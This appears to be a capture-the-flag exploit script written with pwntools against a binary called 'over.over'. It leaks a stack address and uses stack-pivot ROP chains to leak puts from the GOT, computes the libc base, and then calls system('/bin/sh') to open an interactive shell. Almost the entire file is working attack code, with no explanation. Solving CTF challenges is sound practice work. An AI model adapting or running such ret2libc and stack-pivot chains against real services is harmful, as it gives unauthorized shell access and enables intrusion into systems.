#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./over.over"
libcPath = ""
remoteAddr = "localhost"
remotePort = 9999

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process(elfPath)
    libc = elf.libc

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    #  DEBUG([0x400676])
    io.sendafter(">", '0' * 80)
    stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
    success("stack", stack)

    payload =  flat(['00000000', 0x0000000000400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', p64(stack - 0x70), p64(0x4006BE)])
    io.sendafter(">", payload)

    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
    success("libc.address", libc.address)

    payload =  flat(['00000000', 0x0000000000400793, next(libc.search("/bin/sh")), libc.sym['system'], 0x400676, (80 - 40) * '1', p64(stack - 0xa0), p64(0x4006BE)])
    io.sendafter(">", payload)

    io.interactive()
    io.close()
